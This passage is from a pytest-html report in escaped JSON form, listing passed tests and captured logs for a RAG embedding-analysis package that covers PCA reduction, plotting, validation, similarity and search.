&#34;tests/test_rag_analysis.py::TestPCAReducer::test_explained_variance&#34;, &#34;duration&#34;: &#34;2 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestPCAReducer::test_explained_variance&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;2 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:24:45 - rag_api.analysis.pca_reducer - INFO - Fitting PCA with 5 components on 20 embeddings\n2025-12-18 09:24:45 - rag_api.analysis.pca_reducer - INFO - .2%\n\n------------------------------ Captured log call -------------------------------\nINFO     rag_api.analysis.pca_reducer:pca_reducer.py:60 Fitting PCA with 5 components on 20 embeddings\nINFO     rag_api.analysis.pca_reducer:pca_reducer.py:69 .2%\n\n&#34;}], &#34;tests/test_rag_analysis.py::TestPCAReducer::test_fit_transform&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestPCAReducer::test_fit_transform&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestPCAReducer::test_fit_transform&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:24:45 - rag_api.analysis.pca_reducer - INFO - Fitting PCA with 5 components on 20 embeddings\n2025-12-18 09:24:45 - rag_api.analysis.pca_reducer - INFO - .2%\n2025-12-18 09:24:45 - rag_api.analysis.pca_reducer - INFO - Transforming 20 embeddings to 5D space\n\n------------------------------ Captured log call -------------------------------\nINFO     rag_api.analysis.pca_reducer:pca_reducer.py:60 Fitting PCA with 5 components on 20 embeddings\nINFO     rag_api.analysis.pca_reducer:pca_reducer.py:69 .2%\nINFO     rag_api.analysis.pca_reducer:pca_reducer.py:96 Transforming 20 embeddings to 5D space\n\n&#34;}], &#34;tests/test_rag_analysis.py::TestPCAReducer::test_save_load_model&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestPCAReducer::test_save_load_model&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestPCAReducer::test_save_load_model&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:24:45 - rag_api.analysis.pca_reducer - INFO - Fitting PCA with 5 components on 20 embeddings\n2025-12-18 09:24:45 - rag_api.analysis.pca_reducer - INFO - .2%\n2025-12-18 09:24:45 - rag_api.analysis.pca_reducer - INFO - PCA model saved to /var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmpaw3ts1gz.json\n2025-12-18 09:24:45 - rag_api.analysis.pca_reducer - INFO - PCA model loaded from /var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmpaw3ts1gz.json\n\n------------------------------ Captured log call -------------------------------\nINFO     rag_api.analysis.pca_reducer:pca_reducer.py:60 Fitting PCA with 5 components on 20 embeddings\nINFO     rag_api.analysis.pca_reducer:pca_reducer.py:69 .2%\nINFO     rag_api.analysis.pca_reducer:pca_reducer.py:306 PCA model saved to /var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmpaw3ts1gz.json\nINFO     rag_api.analysis.pca_reducer:pca_reducer.py:339 PCA model loaded from /var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmpaw3ts1gz.json\n\n&#34;}], &#34;tests/test_rag_analysis.py::TestEmbeddingVisualizer::test_plot_embedding_distribution&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestEmbeddingVisualizer::test_plot_embedding_distribution&#34;, &#34;duration&#34;: &#34;203 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestEmbeddingVisualizer::test_plot_embedding_distribution&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;203 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:24:45 - rag_api.analysis.embedding_visualizer - INFO - Creating distribution plots for 20 embeddings\n2025-12-18 09:24:46 - rag_api.analysis.embedding_visualizer - INFO - Plot saved to /var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmpkf2wct53.png\n\n------------------------------ Captured log call -------------------------------\nINFO     rag_api.analysis.embedding_visualizer:embedding_visualizer.py:277 Creating distribution plots for 20 embeddings\nINFO     rag_api.analysis.embedding_visualizer:embedding_visualizer.py:568 Plot saved to /var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmpkf2wct53.png\n\n&#34;}], &#34;tests/test_rag_analysis.py::TestEmbeddingVisualizer::test_plot_pca_scatter&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestEmbeddingVisualizer::test_plot_pca_scatter&#34;, &#34;duration&#34;: &#34;40 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestEmbeddingVisualizer::test_plot_pca_scatter&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;40 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:24:46 - rag_api.analysis.embedding_visualizer - INFO - Creating 2D PCA scatterplot for 20 embeddings\n2025-12-18 09:24:46 - rag_api.analysis.pca_reducer - INFO - Fitting PCA with 2 components on 20 embeddings\n2025-12-18 09:24:46 - rag_api.analysis.pca_reducer - INFO - .2%\n2025-12-18 09:24:46 - rag_api.analysis.pca_reducer - INFO - Transforming 20 embeddings to 2D space\n2025-12-18 09:24:46 - rag_api.analysis.embedding_visualizer - INFO - Plot saved to /var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmpg_hwxm0_.png\n\n------------------------------ Captured log call -------------------------------\nINFO     rag_api.analysis.embedding_visualizer:embedding_visualizer.py:130 Creating 2D PCA scatterplot for 20 embeddings\nINFO     rag_api.analysis.pca_reducer:pca_reducer.py:60 Fitting PCA with 2 components on 20 embeddings\nINFO     rag_api.analysis.pca_reducer:pca_reducer.py:69 .2%\nINFO     rag_api.analysis.pca_reducer:pca_reducer.py:96 Transforming 20 embeddings to 2D space\nINFO     rag_api.analysis.embedding_visualizer:embedding_visualizer.py:568 Plot saved to /var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmpg_hwxm0_.png\n\n&#34;}], &#34;tests/test_rag_analysis.py::TestEmbeddingVisualizer::test_plot_statistics_dashboard&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestEmbeddingVisualizer::test_plot_statistics_dashboard&#34;, &#34;duration&#34;: &#34;217 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestEmbeddingVisualizer::test_plot_statistics_dashboard&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;217 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:24:46 - api.rag_api.analysis.embedding_analyzer - INFO - Computing statistics for 20 embeddings\n2025-12-18 09:24:46 - api.rag_api.analysis.embedding_analyzer - INFO - Statistics computation completed successfully\n2025-12-18 09:24:46 - rag_api.analysis.embedding_visualizer - INFO - Creating statistics dashboard\n2025-12-18 09:24:46 - rag_api.analysis.embedding_visualizer - INFO - Plot saved to /var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmpby9gkry4.png\n\n------------------------------ Captured log call -------------------------------\nINFO     api.rag_api.analysis.embedding_analyzer:embedding_analyzer.py:210 Computing statistics for 20 embeddings\nINFO     api.rag_api.analysis.embedding_analyzer:embedding_analyzer.py:346 Statistics computation completed successfully\nINFO     rag_api.analysis.embedding_visualizer:embedding_visualizer.py:395 Creating statistics dashboard\nINFO     rag_api.analysis.embedding_visualizer:embedding_visualizer.py:568 Plot saved to /var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmpby9gkry4.png\n\n&#34;}], &#34;tests/test_rag_analysis.py::TestEmbeddingValidator::test_generate_validation_report&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestEmbeddingValidator::test_generate_validation_report&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestEmbeddingValidator::test_generate_validation_report&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:24:46 - rag_api.analysis.embedding_validator - INFO - Generating validation report for 10 embeddings\n2025-12-18 09:24:46 - rag_api.analysis.embedding_validator - INFO - Validation report generated: FAIL\n\n------------------------------ Captured log call -------------------------------\nINFO     rag_api.analysis.embedding_validator:embedding_validator.py:437 Generating validation report for 10 embeddings\nINFO     rag_api.analysis.embedding_validator:embedding_validator.py:501 Validation report generated: FAIL\n\n&#34;}], &#34;tests/test_rag_analysis.py::TestEmbeddingValidator::test_strict_mode_validation&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestEmbeddingValidator::test_strict_mode_validation&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestEmbeddingValidator::test_strict_mode_validation&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:24:46 - rag_api.analysis.embedding_validator - INFO - Generating validation report for 10 embeddings\n2025-12-18 09:24:46 - rag_api.analysis.embedding_validator - INFO - Validation report generated: FAIL\n\n------------------------------ Captured log call -------------------------------\nINFO     rag_api.analysis.embedding_validator:embedding_validator.py:437 Generating validation report for 10 embeddings\nINFO     rag_api.analysis.embedding_validator:embedding_validator.py:501 Validation report generated: FAIL\n\n&#34;}], &#34;tests/test_rag_analysis.py::TestEmbeddingValidator::test_validate_dimensions&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestEmbeddingValidator::test_validate_dimensions&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestEmbeddingValidator::test_validate_dimensions&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_rag_analysis.py::TestEmbeddingValidator::test_validate_dimensions_edge_cases&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestEmbeddingValidator::test_validate_dimensions_edge_cases&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestEmbeddingValidator::test_validate_dimensions_edge_cases&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_rag_analysis.py::TestEmbeddingValidator::test_validate_metadata&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestEmbeddingValidator::test_validate_metadata&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestEmbeddingValidator::test_validate_metadata&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_rag_analysis.py::TestEmbeddingValidator::test_validate_norms&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestEmbeddingValidator::test_validate_norms&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestEmbeddingValidator::test_validate_norms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_rag_analysis.py::TestEmbeddingValidator::test_validate_norms_edge_cases&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestEmbeddingValidator::test_validate_norms_edge_cases&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestEmbeddingValidator::test_validate_norms_edge_cases&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_rag_analysis.py::TestEmbeddingValidator::test_validate_similarity_range&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestEmbeddingValidator::test_validate_similarity_range&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestEmbeddingValidator::test_validate_similarity_range&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_rag_analysis.py::TestSimilarityAnalyzer::test_analyze_similarity_distribution&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestSimilarityAnalyzer::test_analyze_similarity_distribution&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestSimilarityAnalyzer::test_analyze_similarity_distribution&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:24:46 - rag_api.analysis.similarity_analyzer - INFO - Computing pairwise similarities for 20 embeddings\n2025-12-18 09:24:46 - rag_api.analysis.similarity_analyzer - INFO - Pairwise similarity computation completed\n2025-12-18 09:24:46 - rag_api.analysis.similarity_analyzer - INFO - Analyzing similarity distribution\n2025-12-18 09:24:46 - rag_api.analysis.similarity_analyzer - INFO - Similarity distribution analysis completed. Mean: 0.129\n\n------------------------------ Captured log call -------------------------------\nINFO     rag_api.analysis.similarity_analyzer:similarity_analyzer.py:52 Computing pairwise similarities for 20 embeddings\nINFO     rag_api.analysis.similarity_analyzer:similarity_analyzer.py:92 Pairwise similarity computation completed\nINFO     rag_api.analysis.similarity_analyzer:similarity_analyzer.py:223 Analyzing similarity distribution\nINFO     rag_api.analysis.similarity_analyzer:similarity_analyzer.py:274 Similarity distribution analysis completed. Mean: 0.129\n\n&#34;}], &#34;tests/test_rag_analysis.py::TestSimilarityAnalyzer::test_compute_pairwise_similarities&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestSimilarityAnalyzer::test_compute_pairwise_similarities&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestSimilarityAnalyzer::test_compute_pairwise_similarities&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:24:46 - rag_api.analysis.similarity_analyzer - INFO - Computing pairwise similarities for 5 embeddings\n2025-12-18 09:24:46 - rag_api.analysis.similarity_analyzer - INFO - Pairwise similarity computation completed\n\n------------------------------ Captured log call -------------------------------\nINFO     rag_api.analysis.similarity_analyzer:similarity_analyzer.py:52 Computing pairwise similarities for 5 embeddings\nINFO     rag_api.analysis.similarity_analyzer:similarity_analyzer.py:92 Pairwise similarity computation completed\n\n&#34;}], &#34;tests/test_rag_analysis.py::TestSimilarityAnalyzer::test_detect_duplicates&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestSimilarityAnalyzer::test_detect_duplicates&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestSimilarityAnalyzer::test_detect_duplicates&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:24:46 - rag_api.analysis.similarity_analyzer - INFO - Computing pairwise similarities for 20 embeddings\n2025-12-18 09:24:46 - rag_api.analysis.similarity_analyzer - INFO - Pairwise similarity computation completed\n2025-12-18 09:24:46 - rag_api.analysis.similarity_analyzer - INFO - Detecting duplicates with threshold 0.95\n2025-12-18 09:24:46 - rag_api.analysis.similarity_analyzer - INFO - Detected 3 duplicate groups\n\n------------------------------ Captured log call -------------------------------\nINFO     rag_api.analysis.similarity_analyzer:similarity_analyzer.py:52 Computing pairwise similarities for 20 embeddings\nINFO     rag_api.analysis.similarity_analyzer:similarity_analyzer.py:92 Pairwise similarity computation completed\nINFO     rag_api.analysis.similarity_analyzer:similarity_analyzer.py:298 Detecting duplicates with threshold 0.95\nINFO     rag_api.analysis.similarity_analyzer:similarity_analyzer.py:332 Detected 3 duplicate groups\n\n&#34;}], &#34;tests/test_rag_analysis.py::TestSimilarityAnalyzer::test_find_most_similar&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestSimilarityAnalyzer::test_find_most_similar&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestSimilarityAnalyzer::test_find_most_similar&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:24:46 - rag_api.analysis.similarity_analyzer - INFO - Computing pairwise similarities for 20 embeddings\n2025-12-18 09:24:46 - rag_api.analysis.similarity_analyzer - INFO - Pairwise similarity computation completed\n2025-12-18 09:24:46 - rag_api.analysis.similarity_analyzer - INFO - Finding top 3 most similar pairs\n2025-12-18 09:24:46 - rag_api.analysis.similarity_analyzer - INFO - Found 3 most similar pairs\n\n------------------------------ Captured log call -------------------------------\nINFO     rag_api.analysis.similarity_analyzer:similarity_analyzer.py:52 Computing pairwise similarities for 20 embeddings\nINFO     rag_api.analysis.similarity_analyzer:similarity_analyzer.py:92 Pairwise similarity computation completed\nINFO     rag_api.analysis.similarity_analyzer:similarity_analyzer.py:116 Finding top 3 most similar pairs\nINFO     rag_api.analysis.similarity_analyzer:similarity_analyzer.py:147 Found 3 most similar pairs\n\n&#34;}], &#34;tests/test_rag_analysis.py::TestEmbeddingSearch::test_generate_query_embedding&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestEmbeddingSearch::test_generate_query_embedding&#34;, &#34;duration&#34;: &#34;00:00:03&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestEmbeddingSearch::test_generate_query_embedding&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:03&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:24:46 - rag_api.analysis.embedding_search - INFO - Loading sentence transformer model: all-MiniLM-L6-v2\n2025-12-18 09:24:49 - rag_api.analysis.embedding_search - INFO - Model loaded successfully\n\n------------------------------ Captured log call -------------------------------\nINFO     rag_api.analysis.embedding_search:embedding_search.py:51 Loading sentence transformer model: all-MiniLM-L6-v2\nINFO     rag_api.analysis.embedding_search:embedding_search.py:53 Model loaded successfully\n\n&#34;}], &#34;tests/test_rag_analysis.py::TestEmbeddingSearch::test_generate_query_embedding_edge_cases&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestEmbeddingSearch::test_generate_query_embedding_edge_cases&#34;, &#34;duration&#34;: &#34;00:00:02&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestEmbeddingSearch::test_generate_query_embedding_edge_cases&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:02&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:24:49 - rag_api.analysis.embedding_search - INFO - Loading sentence transformer model: all-MiniLM-L6-v2\n2025-12-18 09:24:51 - rag_api.analysis.embedding_search - INFO - Model loaded successfully\n\n------------------------------ Captured log call -------------------------------\nINFO     rag_api.analysis.embedding_search:embedding_search.py:51 Loading sentence transformer model: all-MiniLM-L6-v2\nINFO     rag_api.analysis.embedding_search:embedding_search.py:53 Model loaded successfully\n\n&#34;}], &#34;tests/test_rag_analysis.py::TestEmbeddingSearch::test_multi_query_search&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestEmbeddingSearch::test_multi_query_search&#34;, &#34;duration&#34;: &#34;00:00:02&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestEmbeddingSearch::test_multi_query_search&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:02&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:24:51 - rag_api.analysis.embedding_search - INFO - Loading sentence transformer model: all-MiniLM-L6-v2\n2025-12-18 09:24:53 - rag_api.analysis.embedding_search - INFO - Model loaded successfully\n2025-12-18 09:24:53 - rag_api.analysis.embedding_search - INFO - Multi-query search with 2 queries, method: max\n2025-12-18 09:24:53 - rag_api.analysis.embedding_search - INFO - Multi-query search completed, found 3 results\n\n------------------------------ Captured log call -------------------------------\nINFO     rag_api.analysis.embedding_search:embedding_search.py:51 Loading sentence transformer model: all-MiniLM-L6-v2\nINFO     rag_api.analysis.embedding_search:embedding_search.py:53 Model loaded successfully\nINFO     rag_api.analysis.embedding_search:embedding_search.py:211 Multi-query search with 2 queries, method: max\nINFO     rag_api.analysis.embedding_search:embedding_search.py:266 Multi-query search completed, found 3 results\n\n&#34;}], &#34;tests/test_rag_analysis.py::TestEmbeddingSearch::test_reranking&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestEmbeddingSearch::test_reranking&#34;, &#34;duration&#34;: &#34;00:00:02&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestEmbeddingSearch::test_reranking&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:02&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:24:53 - rag_api.analysis.embedding_search - INFO - Loading sentence transformer model: all-MiniLM-L6-v2\n2025-12-18 09:24:55 - rag_api.analysis.embedding_search - INFO - Model loaded successfully\n2025-12-18 09:24:55 - rag_api.analysis.embedding_search - INFO - Searching 10 embeddings with top_k=5\n2025-12-18 09:24:55 - rag_api.analysis.embedding_search - INFO - Found 2 results above threshold 0.0\n2025-12-18 